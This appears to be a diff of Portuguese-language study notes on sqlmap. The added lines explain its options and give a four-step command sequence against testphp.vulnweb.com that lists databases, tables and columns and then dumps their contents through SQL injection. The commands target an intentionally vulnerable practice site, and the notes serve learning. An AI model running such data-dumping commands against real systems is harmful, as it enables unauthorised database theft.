@@ -4,14 +4,36 @@ SQLMAP
 -> É compatível com os bancos de dados:
     -> MySQL, Oracle, PostreSQL, Microsoft SQL Server, SQLite, entre outros
 
+obs: 
 ____________________________________________________________________________________________________________________________________________
 
 USO
 
 ==> PARÂMETROS
-    -u (seguido da url do site para especificar o alvo)
-    --cookie (seguido do valor do cookie para ser enviado junto a solicitaçao)
+    -u 'site.com' (seguido da url do site para especificar o alvo)
+    --cookie 'cookie'(seguido do valor do cookie para ser enviado junto a solicitaçao)
     --data (especifica os dados POST que serao enviados na solicitacao)
-    --level (define o nivel do ataque, quanto maior mais agressivo porem mais lento (1, 2, 3 ..))
+    --level 4 (por exemplo) (define o nivel do ataque, quanto maior mais agressivo porem mais lento (1, 2, 3 ..))
     --threads (especifica a quant. de threads devem ser usadas simultaneamente para explorar a vulnerabilidade)
-        -> 
+    -r header.txt (passa o header de conexao http, no caso de uso, nao precisa passar a -u)
+
+    *** voltados à base de dados ***
+
+    --dbs (quando se quer o nome da base de dados)
+    -D nome-da-db (quando ja se tem o nome da base de dados)
+
+    --tables (quando se quer o nome das tabelas)
+    -T nome-da-tabela (quando ja se tem o nome e esta referenciando a tabela)
+
+    --columns (quando se quer o nome das colunas)
+    -C nome-da-coluna (quando ja se tem o nome e esta referenciando a coluna)
+
+    1) sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=2' --dbs
+        -> vai retornar o nome da base de dados
+    2) sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=2' -D nome-da-db --tables
+        -> vai retornar o nome das tabelas
+    3) sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=2' -D nome-da-db -T nome-da-tabela --columns
+        -> vai retornar o nome das colunas da base de dados
+    4) sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=2' -D nome-da-db -T nome-da-tabela -C coluna1,coluna2,coluna3... --dump
+        -> vai retornar os valores que estao naquelas colunas
+
